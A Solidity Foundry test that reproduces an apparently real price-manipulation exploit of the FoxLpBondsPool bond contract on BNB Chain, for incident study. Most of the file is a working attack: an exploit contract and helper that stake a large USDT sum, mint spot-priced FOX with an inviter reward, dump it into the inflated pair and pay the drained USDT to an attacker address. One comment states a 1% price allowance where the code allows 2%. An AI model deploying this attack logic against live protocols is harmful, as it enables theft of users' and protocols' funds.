// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~113k USDT (~$120k reported)
// Attacker : 0x5670d36f00bc7f6860b6afddb288e3668efc0ef9
// Attack Contract : 0x3a82a2a77061017927e5331fffd07c0308a1d2da
// Vulnerable Contract : 0x9fa6d8a13b35e051bfc145918db0111dec13d1a0 (FoxLpBondsPool proxy)
// Treasury : 0x361d08ff43761e6a7e8fcabe48048ae9010801cc
// Attack Tx : https://bscscan.com/tx/0x8e1775cbfd44db29744cc6687ff1822d2c47321de6e94062f789ad6181ad5514

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x58e2a853bb14e46befd3148bd4280370fea4655a#code
// Treasury implementation : https://bscscan.com/address/0x87614d97808dcdecb069fe8489848fa1c001e04d#code

// @Analysis
// Twitter Guy : https://x.com/TenArmorAlert/status/2089170318049132843
//
// FoxLpBondsPool.stake() prices the LP-bond mint with Pancake getAmountsOut(1 FOX)
// (spot reserves), THEN swaps half the deposited USDT into the same FOX/USDT pair
// and adds the rest as liquidity. Treasury.lpBonds mints FOX = usdt / spotPrice
// plus a 3% inviter reward that is liquid and immediately transferable. Selling
// that freshly minted inviter FOX back into the now USDT-heavy pair drains the
// original pool USDT. The live attacker aggregated ~482M USDT from 20+ flash
// sources so the inviter FOX could buy back the dumped stablecoins; this PoC
// seeds an equivalent war chest (the bug is the spot-priced mint, not the
// flash-loan routing).

address constant ATTACKER = 0x5670d36f00bc7F6860B6AfdDb288E3668efc0ef9;
address constant FOX = 0xdF81d50c6657487D19B66A1b5375E35A804Abb93;
address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant FOX_USDT_PAIR = 0xAAb18bCDEe287AEA288c0560612cAadf7c328803;
address payable constant PANCAKE_ROUTER = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
address constant LP_BONDS_POOL = 0x9fa6D8a13b35E051BFc145918db0111dEc13D1A0;
address constant TREASURY = 0x361d08ff43761E6a7E8Fcabe48048AE9010801cc;
address constant REFERRAL = 0xAa237ABB282Ae5476c1D22dE7e84fa7cbeEeDC9F;
address constant REFERRAL_OWNER = 0x12896036059ce563b713754f959353F4f4c1c55C;
address constant REFERRAL_ROOT = 0x2bAE6c628fFfFB391CdB36d57cA5Cdf4e03540f7;

// Same order of magnitude as the live 482M flash-loan aggregation.
uint256 constant WAR_CHEST = 450_000_000 ether;

interface IFoxLpBondsPool {
    function stake(uint256 _usdtAmount, uint256 _swapPrice) external;
    function getSwapPrice(uint256 _timestamp) external view returns (uint256, uint256);
}

interface IReferral {
    function setReferral(address _userAddress, address _inviterAddress) external;
    function referralMap(address user) external view returns (address);
    function rootAddress() external view returns (address);
    function owner() external view returns (address);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        // Pre-attack block (exploit landed in 116169049).
        uint256 forkBlock = 116_169_048;
        vm.createSelectFork("http://127.0.0.1:8546", forkBlock);
        fundingToken = USDT_TOKEN;

        vm.label(ATTACKER, "Attacker EOA");
        vm.label(FOX, "FOX");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(FOX_USDT_PAIR, "FOX/USDT pair");
        vm.label(PANCAKE_ROUTER, "Pancake router");
        vm.label(LP_BONDS_POOL, "FoxLpBondsPool");
        vm.label(TREASURY, "Treasury");
        vm.label(REFERRAL, "Referral");
    }

    function testExploit() public {
        FoxMarketExploit exploit = new FoxMarketExploit(ATTACKER);

        // Permissionless users need a signer-backed referral. The owner setter
        // is used here only so the PoC can bind a fresh contract into the tree.
        // The original attacker obtained the same binding via setReferral(..., rsv).
        vm.startPrank(REFERRAL_OWNER);
        IReferral(REFERRAL).setReferral(address(exploit), REFERRAL_ROOT);
        IReferral(REFERRAL).setReferral(address(exploit.staker()), address(exploit));
        vm.stopPrank();

        // Stand-in for the live attacker's 20+ flash-loan sources.
        deal(USDT_TOKEN, address(exploit), WAR_CHEST);

        uint256 attackerBefore = IERC20(USDT_TOKEN).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        exploit.attack();

        uint256 profit = IERC20(USDT_TOKEN).balanceOf(ATTACKER) - attackerBefore;
        emit log_named_decimal_uint("USDT profit", profit, 18);
        logTokenBalance(USDT_TOKEN, ATTACKER, "Attacker Final");
        assertGt(profit, 100_000 ether, "USDT profit");
    }
}

contract StakerHelper {
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IFoxLpBondsPool private constant pool = IFoxLpBondsPool(LP_BONDS_POOL);

    function bond(uint256 usdtAmount, uint256 swapPrice) external {
        usdt.approve(LP_BONDS_POOL, usdtAmount);
        pool.stake(usdtAmount, swapPrice);
        uint256 leftover = usdt.balanceOf(address(this));
        if (leftover > 0) {
            usdt.transfer(msg.sender, leftover);
        }
    }
}

contract FoxMarketExploit {
    address private immutable profitReceiver;
    StakerHelper public immutable staker;

    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    IERC20 private constant fox = IERC20(FOX);
    IPancakeRouter private constant router = IPancakeRouter(PANCAKE_ROUTER);
    IFoxLpBondsPool private constant pool = IFoxLpBondsPool(LP_BONDS_POOL);

    constructor(address profitReceiver_) {
        profitReceiver = profitReceiver_;
        staker = new StakerHelper();
    }

    function attack() external {
        require(msg.sender == profitReceiver, "only receiver");

        uint256 startedWith = usdt.balanceOf(address(this));

        (uint256 swapPrice,) = pool.getSwapPrice(0);
        // Allow 1% upward drift vs the quoted price (pool's own slippage check).
        uint256 maxPrice = swapPrice + swapPrice / 50;

        usdt.transfer(address(staker), startedWith);
        staker.bond(startedWith, maxPrice);

        // Inviter FOX was minted to this contract. Dump it into the inflated pair.
        uint256 foxBal = fox.balanceOf(address(this));
        require(foxBal > 0, "no inviter FOX");
        fox.approve(PANCAKE_ROUTER, foxBal);
        address[] memory path = new address[](2);
        path[0] = FOX;
        path[1] = USDT_TOKEN;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            foxBal, 1, path, address(this), block.timestamp
        );

        uint256 endedWith = usdt.balanceOf(address(this));
        require(endedWith > startedWith, "not profitable");
        usdt.transfer(profitReceiver, endedWith - startedWith);
    }
}
